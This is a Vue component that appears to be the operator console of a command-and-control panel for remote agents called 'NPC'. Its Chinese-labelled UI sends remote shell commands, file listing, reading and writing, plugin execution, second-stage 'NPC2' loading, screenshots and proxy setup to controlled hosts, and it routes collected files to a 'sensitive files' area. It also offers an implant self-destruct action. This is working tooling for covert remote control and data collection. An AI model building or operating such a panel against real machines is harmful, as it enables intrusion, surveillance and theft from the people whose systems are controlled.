<script setup>
import { ref, reactive, watch, onMounted, onBeforeUnmount, nextTick } from 'vue'
import { Terminal } from '@xterm/xterm'
import { FitAddon } from '@xterm/addon-fit'
import { ElMessage, ElMessageBox } from 'element-plus'
import { nps } from '@/utils/nps.js'
import { sendAgentEvent } from '@/api/event'
import { agentStop, pluginList, agentScreen } from '@/api/agent'
import { licenseAllowed } from '@/utils/license'
import ProxyDialog from '@/components/proxy/ProxyDialog.vue'
import { useAgentLogSocket } from '@/composables/useAgentLogSocket'
import { useAuthStore } from '@/stores/auth'
import { parseChunkArgs } from '@/utils/chunk'
const props = defineProps({
  agentId: { type: String, required: true },
  agent: { type: Object, default: () => ({}) },
})
const emit = defineEmits(['npc2-change'])

const authStore = useAuthStore()

const termRef = ref(null)
let term = null
let fitAddon = null
let resizeObserver = null

const { uid, connect, disconnect, lastEvent } = useAgentLogSocket()

const st = reactive({
  cmd: '',
  pwd: '',
  history: [],
})

let historyIndex = -1
let cmdDraft = ''

let promptInited = false

watch(
  () => props.agent,
  (agent) => {
    if (agent && agent.id && agent.process) {
      const parts = String(agent.process).replaceAll('\\', '/').split('/')
      parts.pop()
      st.pwd = parts.join('/')

    }
  },
)

function bytesToSize(bytes) {
  const n = Number(bytes)
  if (!isFinite(n) || n <= 0) return '-'
  const units = ['B', 'KB', 'MB', 'GB', 'TB']
  const i = Math.min(Math.floor(Math.log(n) / Math.log(1024)), units.length - 1)
  if (i === 0) return `${n} B`
  return `${(n / 1024 ** i).toFixed(i >= 2 ? 2 : 1)} ${units[i]}`
}

function formatTime(ts) {
  const n = Number(ts)
  if (!isFinite(n) || n <= 0) return ''
  const d = new Date(n * 1000)
  const pad = (x) => String(x).padStart(2, '0')
  return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}`
}

function utf8ArrayToStr(array) {
  if (!array) return ''
  const decoder = new TextDecoder()
  return decoder.decode(array).replace(/\r\n|\r|\n/g, '\r\n')
}

function writePrompt() {
  if (!term) return
  const u = props.agent.username || '?'
  const h = props.agent.hostname || '?'

  const lead = promptInited ? '\r\n' : ''
  promptInited = true
  term.write(`${lead}[${u}@${h} ${st.pwd}]# `)
}

function termWrite(text) {
  if (term) term.write(text)
}

function termWriteln(text) {
  if (term) term.writeln(text)
}

function emitAction(event) {
  sendAgentEvent(event, uid, props.agentId).catch(() => {
    ElMessage.error('命令发送失败')
  })
}

const shotLoading = ref(false)

async function doScreenshot() {
  if (!props.agent.npc2) {
    ElMessage.warning('请先加载NPC2后再截屏')
    return
  }
  shotLoading.value = true
  try {
    const res = await agentScreen(props.agentId, authStore.target)
    const r = res && res.result
    if (r && r.filename) {
      ElMessage.success(`截屏成功: ${r.filename} (${bytesToSize(r.size)})，请前往敏感文件查看`)
    } else {
      ElMessage.error((res && res.message) || '截屏失败')
    }
  } catch {
    ElMessage.error('截屏请求失败')
  } finally {
    shotLoading.value = false
  }
}

async function doExit() {
  try {
    await ElMessageBox.confirm('确定销毁该NPC吗?', '提示', { type: 'warning' })
    const conf = nps.Config.create()
    conf.action = 2
    const event = nps.AgentEvent.create()
    event.conf = conf
    emitAction(event)
    ElMessage.success('NPC销毁命令已发送')
  } catch {

  }
}

async function doNpc2Load() {
  const isLoaded = props.agent.npc2
  if (!isLoaded && !licenseAllowed()) return
  try {
    await ElMessageBox.confirm(
      `确定${isLoaded ? '卸载' : '加载'}NPC2吗?`,
      '提示',
      { type: 'warning' },
    )
    if (!isLoaded) {
      const plugin = nps.Plugin.create()
      plugin.act = 'ex'
      plugin.name = 'npc2'
      const event = nps.AgentEvent.create()
      event.plugin = plugin
      emitAction(event)
      ElMessage.success('NPC2加载中，请等待返回')

      emit('npc2-change', true)
    } else {

      await agentStop(props.agentId)
      ElMessage.success('NPC2卸载命令已发送')

      emit('npc2-change', false)
    }
  } catch {

  }
}

// fw 单次事件上传上限：整份数据会在服务端事件队列里完整驻留一次，
// 超过这个体量请改用 SFTP（文件管理里的「上传」走流式分块）
const FW_MAX_SIZE = 256 * 1024 * 1024

async function handleUpload(file) {
  if (file.size > FW_MAX_SIZE) {
    ElMessage.warning(`fw 上传单次上限 ${bytesToSize(FW_MAX_SIZE)}，大文件请用文件管理里的 SFTP 上传`)
    return false
  }
  try {
    // 异步读取 + O(n) base64，避免整文件同步读取和逐字节拼接把主线程卡死
    const buf = await file.arrayBuffer()
    const action = nps.Action.create()
    action.act = 'fw'
    action.path = file.name
    action.data = new Uint8Array(buf)
    const event = nps.AgentEvent.create()
    event.action = action
    await sendAgentEvent(event, uid, props.agentId)
    // 写入回执由 agent 的 fw 事件驱动，这里只提示上传完成
    ElMessage.success(`文件:${file.name} 上传完成 (${bytesToSize(file.size)})`)
  } catch {
    ElMessage.error('文件上传失败')
  }
  return false
}

const plugVisible = ref(false)
const plugLoading = ref(false)
const plugList_data = ref([])
const plugForm = reactive({ name: '', entry: '', args: '' })

async function openPluginDialog() {
  Object.assign(plugForm, { name: '', entry: '', args: '' })
  plugVisible.value = true
  plugLoading.value = true
  try {
    const res = await pluginList()
    plugList_data.value = ((res && res.result) || {}).items || []
  } catch {

  } finally {
    plugLoading.value = false
  }
}

function onPluginChange(name) {
  const p = plugList_data.value.find((x) => x.name === name)
  if (p) {
    plugForm.entry = p.entry || ''
    plugForm.args = p.args || ''
  }
}

function submitPlugin() {
  if (!plugForm.name) {
    ElMessage.warning('请选择插件')
    return
  }
  const plug = nps.Plugin.create()
  plug.act = 'ex'
  const nameParts = plugForm.name.split('.')
  plug.name = nameParts[0]
  plug.entry = plugForm.entry
  plug.args = plugForm.args

  if (nameParts.length > 1) {
    plug.arch = nameParts[nameParts.length - 1].toLowerCase()
  }
  const event = nps.AgentEvent.create()
  event.plugin = plug
  emitAction(event)
  ElMessage.success(`插件:${plugForm.name} 执行命令已发送`)
  plugVisible.value = false
}

const proxyVisible = ref(false)

function openProxy() {
  proxyVisible.value = true
}

function onCmdKeydown(e) {
  if (e.key === 'ArrowUp') {
    e.preventDefault()
    if (!st.history.length) return
    if (historyIndex === st.history.length) {

      cmdDraft = st.cmd
    }
    if (historyIndex > 0) historyIndex--
    st.cmd = st.history[historyIndex] || ''
  } else if (e.key === 'ArrowDown') {
    e.preventDefault()
    if (!st.history.length) return
    if (historyIndex < st.history.length) historyIndex++
    if (historyIndex === st.history.length) {
      st.cmd = cmdDraft
    } else {
      st.cmd = st.history[historyIndex] || ''
    }
  }
}

function cmdSend() {
  const raw = st.cmd.trim()
  if (!raw) return

  const cmds = raw.split(' ')
  const cmd = cmds[0]
  const action = nps.Action.create()

  if (['cd', 'ls', 'fr'].includes(cmd)) {
    action.act = cmd
    action.path = cmds[1]
  } else if (cmd === 'sh') {
    action.act = 'sh'
    action.name = btoa(cmds.slice(1).join(' '))
  } else if (cmd === 'pl') {
    action.act = 'pl'
    action.name = cmds[1]
    action.args = cmds.slice(2).join(' ')
  } else if (raw === '?' || raw === 'help') {
    printHelp()
    st.cmd = ''
    return
  } else if (raw === 'cls') {
    term.clear()
    writePrompt()
    st.cmd = ''
    return
  } else {
    ElMessage.warning('未知命令，输入 help 查看帮助')
    return
  }

  const event = nps.AgentEvent.create()
  event.action = action
  emitAction(event)
  termWriteln('\r\n' + st.cmd)
  ElMessage.success(`命令:${st.cmd} 已发送`)
  st.history.push(st.cmd)
  historyIndex = st.history.length
  cmdDraft = ''
  st.cmd = ''
}

function printHelp() {
  termWriteln('')
  termWriteln('help/cls  帮助/清屏   ctrl+s 保存会话记录')
  termWriteln('sh        执行命令    sh <cmd>')
  termWriteln('ls        枚举文件    ls <path>')
  termWriteln('cd        切换目录    cd <path>')
  termWriteln('fr        读取文件    fr <path>')
  termWriteln('pl        执行插件    pl <name> <args>')
  writePrompt()
}

watch(lastEvent, (event) => {
  if (!event) return

  if (event.plugin) {
    if (event.plugin.act === 'dd') {
      termWriteln(event.plugin.name + ' ' + (event.plugin.args || ''))
      if (event.plugin.data) {
        termWriteln(utf8ArrayToStr(event.plugin.data))
      }
      writePrompt()
    }
  }

  if (event.action) {
    termWriteln('')
    switch (event.action.act) {
      case 'cd':
        if (event.reqcd && event.reqcd.path) {
          st.pwd = String(event.reqcd.path).replaceAll('\\', '/')
        }
        if (event.action.path) termWriteln(event.action.path)
        break
      case 'ls':
        if (event.action.entrys) {
          event.action.entrys.forEach((entry) => {
            const icon = entry.isfile ? '\ud83d\udcc4' : '\ud83d\udcc1'
            const time = (formatTime(entry.modified) || '-').padEnd(17)
            termWriteln(`${icon}  ${String(entry.path || '').padEnd(50)}  ${time}  ${bytesToSize(entry.size)}`)
          })
        }
        break
      case 'fw':
        termWriteln(`文件写入成功! 文件名:${event.action.path}`)
        break
      case 'fr': {
        // 分段回传：文件内容不进浏览器（nps 已剥离），总长度在 args 里
        const meta = parseChunkArgs(event.action.args)
        const total = meta ? meta.total : (event.action.data ? event.action.data.length : 0)
        if (!meta && event.action.data && event.action.data.length <= 4096) {
          termWriteln(utf8ArrayToStr(event.action.data))
        } else {
          termWriteln(`文件读取成功! 请前往敏感文件项下载, 大小 ${bytesToSize(total)}`)
        }
        break
      }
      case 'sh':
      case 'pl':
        termWriteln(utf8ArrayToStr(event.action.data))
        break
      case 'err':
        termWriteln(`出错了! ${utf8ArrayToStr(event.action.data)}`)
        break
      default:
        break
    }
    writePrompt()
  }
})

function initTerminal() {
  term = new Terminal({
    cursorBlink: true,
    fontSize: 14,
    fontFamily: 'Consolas, "Courier New", monospace',
    disableStdin: false,
    scrollback: 100000,
    theme: {
      background: '#000000',
      foreground: '#c8c8c8',
      cursor: '#c8c8c8',
      selectionBackground: 'rgba(255, 255, 255, 0.25)',
    },
  })
  fitAddon = new FitAddon()
  term.loadAddon(fitAddon)
  term.open(termRef.value)
  try {
    fitAddon.fit()
  } catch {

  }

  term.onKey((e) => {
    if (e.domEvent.ctrlKey || e.domEvent.metaKey) {
      if (e.domEvent.key === 's') {
        e.domEvent.preventDefault()
        saveSession()
      }
    }
  })

  resizeObserver = new ResizeObserver(() => {
    if (fitAddon && term) {
      try {
        fitAddon.fit()
      } catch {

      }
    }
  })
  resizeObserver.observe(termRef.value)

  term.clear()
  termWriteln('\x1b[32m[命令控制台已就绪]\x1b[0m')
  termWriteln('输入 help 查看可用命令，或使用上方按钮执行操作')
  writePrompt()
}

function saveSession() {
  if (!term) return
  const buffer = term.buffer.active
  let content = ''
  for (let i = 0; i < buffer.length; i++) {
    const line = buffer.getLine(i)
    if (line) content += line.translateToString(true) + '\n'
  }
  const blob = new Blob([content], { type: 'text/plain' })
  const a = document.createElement('a')
  a.href = URL.createObjectURL(blob)
  a.download = `${props.agent.intranet || props.agentId}_session.log`
  a.click()
  URL.revokeObjectURL(a.href)
}

onMounted(() => {
  nextTick(() => {
    initTerminal()
    connect()
  })
})

onBeforeUnmount(() => {
  if (resizeObserver) {
    resizeObserver.disconnect()
    resizeObserver = null
  }
  if (term) {
    term.dispose()
    term = null
  }
  disconnect()
})
</script>

<template>
  <div class="console-page">

    <div class="action-bar">
      <template v-if="agent.ntype === 'npc1'">
        <el-button size="small" type="danger" @click="doExit">销毁NPC</el-button>
        <el-upload
          :show-file-list="false"
          :before-upload="handleUpload"
          :multiple="true"
        >
          <el-button size="small" type="primary">上传文件</el-button>
        </el-upload>
        <el-button size="small" :type="agent.npc2 ? 'warning' : 'primary'" @click="doNpc2Load">
          {{ agent.npc2 ? '卸载NPC2' : '加载NPC2' }}
        </el-button>
        <el-button size="small" @click="openPluginDialog">运行插件</el-button>
      </template>
      <el-button v-if="agent.npc2" size="small" type="primary" :loading="shotLoading" @click="doScreenshot">一键截屏</el-button>
      <el-button v-if="agent.npc2" size="small" type="success" @click="openProxy">一键代理</el-button>
      <div class="flex-grow"></div>
      <span class="conn-status" :class="{ on: true }">事件通道: 已连接</span>
    </div>

    
    <div v-if="agent.ntype === 'npc1'" class="cmd-row">
      <el-input
        v-model="st.cmd"
        placeholder="输入命令后回车，输入 help 查看帮助 (↑↓ 切换历史)"
        @keyup.enter="cmdSend"
        @keydown.up="onCmdKeydown"
        @keydown.down="onCmdKeydown"
        clearable
      >
        <template #prepend>命令</template>
      </el-input>
      <el-button type="danger" @click="cmdSend" :disabled="!st.cmd.trim()">发送</el-button>
    </div>

    
    <div ref="termRef" class="console-term"></div>

    
    <el-dialog v-model="plugVisible" title="运行插件" width="500px" v-loading="plugLoading">
      <el-form :model="plugForm" label-width="90px">
        <el-form-item label="插件名称" required>
          <el-select
            v-model="plugForm.name"
            placeholder="选择插件"
            filterable
            style="width: 100%"
            @change="onPluginChange"
          >
            <el-option v-for="p in plugList_data" :key="p.name" :label="p.name" :value="p.name" />
          </el-select>
        </el-form-item>
        <el-form-item label="入口点">
          <el-input v-model="plugForm.entry" placeholder="入口点(可选)" />
        </el-form-item>
        <el-form-item label="运行参数">
          <el-input v-model="plugForm.args" type="textarea" :rows="3" placeholder="运行参数(可选)" />
        </el-form-item>
      </el-form>
      <template #footer>
        <el-button @click="plugVisible = false">取消</el-button>
        <el-button type="primary" @click="submitPlugin">下发指令</el-button>
      </template>
    </el-dialog>

    
    <ProxyDialog v-model="proxyVisible" :locked-id="props.agentId" />
  </div>
</template>

<style scoped>
.console-page {
  display: flex;
  flex-direction: column;
  height: 100%;
  gap: 8px;
}
.action-bar {
  display: flex;
  align-items: center;
  gap: 8px;
  flex-wrap: wrap;
}
.flex-grow {
  flex: 1;
}
.conn-status {
  font-size: 12px;
  color: var(--tk-accent-dim);
  font-family: 'Consolas', monospace;
}
.cmd-row {
  display: flex;
  gap: 8px;
  align-items: center;
}
.console-term {
  flex: 1;
  min-height: 300px;
  padding: 6px;
  background: #000000;
  border: 1px solid var(--tk-border);
  border-radius: 3px;
}
</style>
